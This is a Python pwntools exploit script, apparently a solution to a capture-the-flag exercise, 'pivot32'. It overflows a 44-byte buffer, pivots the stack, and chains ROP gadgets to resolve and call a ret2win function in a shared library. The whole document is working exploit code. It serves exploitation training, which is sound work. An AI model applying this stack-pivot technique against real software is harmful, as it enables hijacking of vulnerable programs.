from pwn import *

context.binary = elf = ELF('./pivot32')

lib = ELF('./libpivot32.so')
off_to_win = lib.sym['ret2win'] - lib.sym['foothold_function']

p = elf.process()
#gdb.attach(p)

offset = 44

pop_eax      = 0x0804882c # pop eax; ret;
xchg_esp_eax = 0x0804882e # xchg esp, eax; ret;
eax_eq_meax  = 0x08048830 # mov eax, dword [eax]
eax_pl_ebx   = 0x08048833 # add eax, ebx
pop_ebx      = 0x080484a9 # pop ebx; ret;
call_eax     = 0x080485f0 # call eax;


p.readuntil("pivot: ")
pivot_best_place = int(str(p.readline()[:-1])[2:-1], 16)
log.info(f'Pivot best place: {hex(pivot_best_place)}')

pyl  = p32(elf.plt['foothold_function'])
pyl += p32(pop_eax)+p32(elf.got['foothold_function'])
pyl += p32(pop_ebx)+p32(off_to_win)
pyl += p32(eax_eq_meax)
pyl += p32(eax_pl_ebx)
pyl += p32(call_eax)

p.sendline(pyl)

pyl  = b'A'*offset
pyl += p32(pop_eax)+p32(pivot_best_place)
pyl += p32(xchg_esp_eax)

p.readline()
p.readline()
p.readline()
p.readline()

p.sendline(pyl)
print(str(p.recvall())[-35:-3])


